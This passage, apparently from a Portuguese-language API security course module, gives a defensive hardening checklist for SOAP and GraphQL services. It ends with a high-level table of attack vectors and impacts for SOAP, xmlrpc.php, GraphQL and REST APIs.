  - Validar SOAPAction contra lista de operações permitidas
  - Autenticar em cada operação individualmente
  - Desativar serviços não utilizados
  - Não expor WSDL publicamente em produção
  - Parser XML com DTD/XXE desabilitado
  - Input validation em todos os parâmetros XML

GraphQL:
  - Desabilitar introspecção em produção
  - Implementar query complexity limits
  - Implementar depth limits (máximo 10 níveis)
  - Rate limiting por complexidade, não por requisição
  - Persisted queries em produção
```

---

## Módulos Relacionados

O módulo `01_rest_api_attacks.md` aborda consumo inseguro de APIs e shadow endpoints no contexto REST, padrões que se repetem em serviços SOAP mal documentados. O módulo `02_graphql_attacks.md` complementa com introspecção e controle de acesso por campo em GraphQL. Para headers CORS e `X-Forwarded-For` processados sem validação em camada HTTP, consulte `../10_http_attacks/02_http_misconfigs.md`.

---

## Resumo: Superfície de Ataque por Tecnologia

| Tecnologia | Principais Vetores | Impacto |
|---|---|---|
| SOAP/WSDL | XXE, SOAPAction spoofing, Injeção | RCE, SSRF, Info disclosure |
| xmlrpc.php | Brute force (multicall), SSRF (pingback) | Account takeover, Reconhecimento |
| GraphQL | IDOR, DoS nested queries, Batch brute force | Data breach, DoS |
| REST API | SQLi, LFI, SSRF, Upload malicioso | RCE, Data breach |
